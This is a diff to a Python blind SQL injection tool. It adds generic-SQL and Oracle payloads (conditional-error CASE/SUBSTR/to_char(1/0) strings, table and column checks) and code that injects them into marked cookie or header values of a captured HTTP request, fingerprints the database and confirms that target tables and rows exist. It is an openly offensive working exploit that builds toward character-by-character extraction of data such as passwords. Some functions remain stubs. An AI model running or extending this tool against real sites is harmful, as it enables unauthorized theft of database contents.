@@ -41,13 +41,19 @@ MARKER = '[[INJECTION_POINT]]'
 FIELD_LENGTH_LIMIT = 50
 
 # SQL Commands
+# 1 - When using conditional errors, if the error is present, we consider that as successful.
+# 1 - When using conditional responses, if the --success string is present, we consider that as successful.
 SQL = {
-    'BASIC_CMD': "||(SELECT '')||",
-    'CONDITIONAL_SUBSTRING_ENUM': "||(SELECT CASE WHEN SUBSTR($field_name,$index,1)='$value' THEN to_char(1/0) ELSE '' END FROM $table WHERE username='$identifier')||"
+    'BASIC': "' || (SELECT '') || '",
+    'CONDITIONAL_SUBSTRING_ENUM': "' || (SELECT CASE WHEN SUBSTR($field_name,$index,1)='$value' THEN to_char(1/0) ELSE '' END FROM $table WHERE $columnName='$columnValue')||",
+    'TABLE_CHECK': "' || (SELECT '' FROM $tableName) || '",
+    'COLUMN_CHECK': "' || (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE $columnName='$columnValue')||'"
 }
 ORACLE = {
-    'BASIC_CMD': "||(SELECT '' from dual}||",
-    'CONDITIONAL_SUBSTRING_ENUM': "||(SELECT CASE WHEN SUBSTR($field_name,$index,1)='$value' THEN to_char(1/0) ELSE '' END FROM $table WHERE username='$identifier')||"
+    'BASIC': "' || (SELECT '' from dual) || '",
+    'CONDITIONAL_SUBSTRING_ENUM': "' || (SELECT CASE WHEN SUBSTR($field_name,$index,1)='$value' THEN to_char(1/0) ELSE '' END FROM $table WHERE $columnName='$columnValue')||",
+    'TABLE_CHECK': "' || (SELECT '' FROM $tableName WHERE ROWNUM = 1) || '",
+    'COLUMN_CHECK': "' || (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE $columnName='$columnValue')||'"
 }
 
 args = parser.parse_args()
@@ -70,6 +76,7 @@ try:
     templateFile = open(args.template, "r")
 except FileNotFoundError:
     error("Template does not exists!")
+    template = ''
 else:
     template = templateFile.read()
     templateFile.close()
@@ -77,65 +84,112 @@ else:
 request_line, headers_alone = template.split('\n', 1)
 
 message = email.message_from_file(io.StringIO(headers_alone))
-headers = dict(message.items())
 protocol = "https://" if args.ssl else "http://"
+headers = dict(message.items())
 url = f"{protocol}{headers['Host']}{request_line.replace('GET ', '').replace(' HTTP/1.1', '')}"
+dbVersion = "UNKNOWN"
 
 
 def isSqlCompatible():
-    result = executeRequest()
+    global dbVersion
     print("Checking SQL is being used")
+    inject(SQL["BASIC"], False)
+    if not executeRequestAndReturnsError():
+        dbVersion = "SQL"
+        return True
+
+    inject(ORACLE["BASIC"], False)
+    if not executeRequestAndReturnsError():
+        dbVersion = "ORACLE"
+        return True
+
+    return False
+
+
+def getSQLCommand(key):
+    match dbVersion:
+        case "SQL":
+            return SQL[key]
+        case "ORACLE":
+            return ORACLE[key]
+        case _:
+            print(f"Unknow database version detected, exiting as this is not supported.")
+            sys.exit()
 
 
 def checkTableExists(tableName):
     print("Checking table exists")
+    inject("TABLE_CHECK")
+
+    return False if executeRequestAndReturnsError() else True
 
 
 def checkRowExists(tableName, columnName, columnValue):
-    print("Checking table exists")
+    print("Checking row exists")
+    inject("COLUMN_CHECK")
+
+    return False if executeRequestAndReturnsError() else True
 
 
 def enumerateFieldLength(tableName, columnExists):
     print("Getting field length...")
-    for x in FIELD_LENGTH_LIMIT:
+    for x in range(FIELD_LENGTH_LIMIT):
         print("Checking length ", x)
 
 
-def generateSqlStatement(sql):
-    print("Generating SQL statement")
+def inject(sqlKey, autolookup=True):
+    global headers
 
-
-def inject(sql):
     print("Injecting SQL into template")
-    for header, value in headers.items():
+    orgSql = getSQLCommand(sqlKey) if autolookup else sqlKey
+    sql = Template(orgSql)
+
+    safeSql = sql.safe_substitute(
+        tableName=tableName, columnName=columnName, columnValue=columnValue)
+
+    # headers = dict(message.items())
+
+    for header, value in message.items():
         if MARKER in value:
-            headers[header] = value.replace(MARKER, f"' {sql}'")
+            headers[header] = value.replace(MARKER, safeSql)
 
-    pprint(headers)
+    print("Injection complete!")
 
 
-def executeRequest():
+# Returns TRUE if success string is found in response.text
+def executeRequestAndReturnsError():
     print("Sending payload")
+
     cookies = dict()
     orgCookies = headers['Cookie'].split(';')
+
     for cookie in orgCookies:
-        fK = cookie.split("=")
-        cookies.update({fK[0]: fK[1]})
+        orgCookieValues = cookie.split("=", 1)
+        cookies.update({orgCookieValues[0]: orgCookieValues[1]})
     response = requests.get(url, cookies=cookies)
-    print(headers['Cookie'])
-    containsMarker = args.success in response.text
-    print(f'Request body returned - {response.headers}\n\n{response.text}')
+
+    print(cookies)
+    result = args.success in response.text
+
+    print(result)
+    return result
 
 
 if not isSqlCompatible():
-    print(f"Target {target} appears to not be process commands as SQL")
+    print(f"{target} appears to not be process commands as SQL")
     sys.exit()
+else:
+    print("SQL seems supported!")
 
 if not checkTableExists(tableName):
     print(f"Table {tableName} does not exist!")
     sys.exit()
+else:
+    print(f"{tableName} is present!")
 
 if not checkRowExists(tableName, columnName, columnValue):
     print(
-        f"Then entry with identifer {columnName} does not exist with a vaule of ${columnValue}!")
+        f"Then entry with identifer {columnName} does not exist with a vaule of {columnValue}!")
     sys.exit()
+else:
+    print(f"Entry has {columnName}={columnValue}")
